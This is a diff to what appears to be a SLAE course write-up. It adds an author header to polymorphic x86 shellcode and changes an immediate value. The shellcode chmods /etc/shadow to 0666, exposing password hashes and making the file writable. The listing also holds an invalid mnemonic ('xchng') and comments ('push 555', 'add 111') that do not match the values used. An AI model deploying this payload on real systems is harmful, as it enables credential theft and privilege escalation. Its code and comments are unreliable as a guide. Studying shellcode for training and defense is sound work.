@@ -57,6 +57,10 @@ int main()
 ```
 Here is a polymorphic version:
 ```nasm
+; SLAE Assignment 6: Polymorphic chmod(/etc/shadow, 0666) & exit()
+; Author:  4p0cryph0n
+; Website:  https://4p0cryph0n.github.io
+
 global _start
 
 section .text
@@ -77,7 +81,7 @@ _start:
   sub esp, 12                                 ;stack adjustment
   mov esi, esp                                ;move pointer to args into esi
   xchng ebx, esi                              ;move pointer to args into ebx
-  push word 0x22b                             ;push 555
+  push word 0x16d                             ;push 555
   pop ecx                                     ;pop it into ecx
   add ecx, 0x49                               ;add 111 to ecx, which makes it 666
   int 0x80                                    ;syscall
